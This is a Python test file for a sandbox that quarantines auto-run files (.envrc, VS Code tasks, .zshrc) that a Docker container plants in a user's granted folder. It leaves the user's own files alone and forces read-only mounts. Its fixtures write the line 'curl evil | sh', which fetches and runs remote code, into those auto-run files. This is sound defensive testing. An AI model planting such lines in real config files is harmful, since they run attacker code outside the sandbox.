# Copyright (c) 2026-present Plane Software, Inc. and contributors
# SPDX-License-Identifier: AGPL-3.0-only
# See the LICENSE file for details.

"""A container has no fence, so its rw bind of a granted folder reaches what `PROTECT_WRITE` keeps
from a command: what the person has there gets a read-only overlay,
and what a container adds is a plant. Against real folders, with no daemon."""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from prismoid.device.docker_policy import recheck
from prismoid.device.frames import DeviceFrameState, FrameRegistry
from prismoid.schemas.device import FolderGrant, FrameSpecIn
from prismoid.schemas.machines import FrameKind
from tests.support.rigs.docker_policy_rig import create, inspected
from tests.support.rigs.plants_rig import ctime_ticks as ctime_ticks
from tests.support.rigs.plants_rig import quarantined


@pytest.fixture
def folder(tmp_path: Path) -> Path:
    made = (tmp_path / "folder").resolve()
    (made / "src").mkdir(parents=True)
    return made


def _frame(home: Path, folder: Path, *, docker: bool = True) -> DeviceFrameState:
    grant = FolderGrant(path=str(folder), mode="rw", name="/work")
    spec = FrameSpecIn(task_id="t1", kind=FrameKind.MACHINE, grants=[grant], docker=docker)
    state = FrameRegistry(home).create(spec)
    state.baseline_plants()
    return state


@pytest.mark.parametrize(
    "written",
    [".envrc", "src/.envrc", ".vscode/tasks.json", ".vscode/settings.json", ".idea/workspace.xml", ".zshrc"],
)
def test_what_a_container_adds_past_the_fence_is_moved(tmp_path: Path, folder: Path, written: str) -> None:
    home = tmp_path / "home"
    state = _frame(home, folder)
    (folder / written).parent.mkdir(exist_ok=True)
    (folder / written).write_text("curl evil | sh")
    state.sweep_plants()
    assert not (folder / written).exists(), "it would run outside the sandbox"
    [kept] = quarantined(home)
    assert kept["kind"] == "runs" and kept["virtual_path"].startswith("/work/")
    assert state.notices[-1].startswith("prismoid: moved /work/")


def test_the_persons_own_stay_and_what_they_do_to_them_stays(tmp_path: Path, folder: Path) -> None:
    """A person's editor saves by rename: a new inode at a path that was theirs is still theirs."""
    (folder / ".envrc").write_text("layout python")
    (folder / ".vscode").mkdir()
    (folder / ".vscode" / "tasks.json").write_text("{}")
    (folder / ".idea").mkdir()
    home = tmp_path / "home"
    state = _frame(home, folder)
    saved = folder / "tmp-save"
    saved.write_text("layout node")
    os.replace(saved, folder / ".envrc")
    (folder / ".idea" / "workspace.xml").write_text("<project/>")
    state.sweep_plants()
    state.sweep_plants()
    assert quarantined(home) == [] and (folder / ".envrc").read_text() == "layout node"
    assert (folder / ".idea" / "workspace.xml").exists()


def test_a_frame_with_no_docker_grant_leaves_the_person_alone(tmp_path: Path, folder: Path) -> None:
    """Nothing of the frame's could have written these: the fence refuses a command, so they are the
    person's, new or not."""
    home = tmp_path / "home"
    state = _frame(home, folder, docker=False)
    (folder / ".envrc").write_text("layout python")
    state.sweep_plants()
    assert quarantined(home) == [] and (folder / ".envrc").exists()


def test_a_docker_grant_given_later_keeps_what_the_person_had(tmp_path: Path, folder: Path) -> None:
    home = tmp_path / "home"
    state = _frame(home, folder, docker=False)
    (folder / ".envrc").write_text("layout python")
    state.sweep_plants()
    assert state.plants.later() == (f"{folder}/.envrc",)


def _people(folder: Path) -> tuple[Path, ...]:
    (folder / ".envrc").write_text("layout python")
    (folder / ".vscode").mkdir()
    (folder / ".idea").mkdir()
    return (folder / ".envrc", folder / ".idea", folder / ".vscode")


def test_a_rw_bind_lays_each_of_them_read_only(tmp_path: Path, folder: Path) -> None:
    people = _people(folder)
    state = _frame(tmp_path / "home", folder)
    assert state.plants.later() == tuple(str(p) for p in people)
    verdict = create({"Binds": [f"{folder}:/app"]}, folder, protected=people)
    assert verdict.allow and verdict.body is not None
    mounts = json.loads(verdict.body)["HostConfig"]["Mounts"]
    assert {(m["Source"], m["Target"], m["ReadOnly"]) for m in mounts} == {
        (str(folder / ".envrc"), "/app/.envrc", True),
        (str(folder / ".idea"), "/app/.idea", True),
        (str(folder / ".vscode"), "/app/.vscode", True),
    }


def test_a_container_started_without_them_is_refused(tmp_path: Path, folder: Path) -> None:
    people = _people(folder)
    mount = {"Type": "bind", "Source": str(folder), "Destination": "/app", "RW": True}
    why, _ = recheck(inspected(None, mount), "web", roots=[str(folder)], protected=[str(p) for p in people])
    assert why is not None and "read-only" in why


def test_a_rw_bind_of_one_of_them_is_refused(folder: Path) -> None:
    people = _people(folder)
    verdict = create({"Binds": [f"{folder}/.vscode:/v"]}, folder, protected=people)
    assert not verdict.allow and "read-only" in verdict.reason


def test_an_inventory_from_before_these_were_kept_takes_nothing_of_the_persons(
    tmp_path: Path, folder: Path
) -> None:
    """A frame made before, on a Mac that has it: its next walk must not read a person's own files
    as new. What is added after that walk still goes."""
    (folder / ".envrc").write_text("layout python")
    (folder / ".vscode").mkdir()
    (folder / ".vscode" / "tasks.json").write_text("{}")
    home = tmp_path / "home"
    state = _frame(home, folder)
    plants = state.base / "plants.json"
    older = {
        root: [i for i in items if i[0] == "git"] for root, items in json.loads(plants.read_text()).items()
    }
    plants.write_text(json.dumps(older))

    again = FrameRegistry(home).frames["device-t1"]
    again.sweep_plants()
    assert quarantined(home) == []
    assert (folder / ".envrc").exists() and (folder / ".vscode" / "tasks.json").exists()

    (folder / "src" / ".envrc").write_text("curl evil | sh")
    again.sweep_plants()
    assert not (folder / "src" / ".envrc").exists()
    assert (folder / ".envrc").exists()
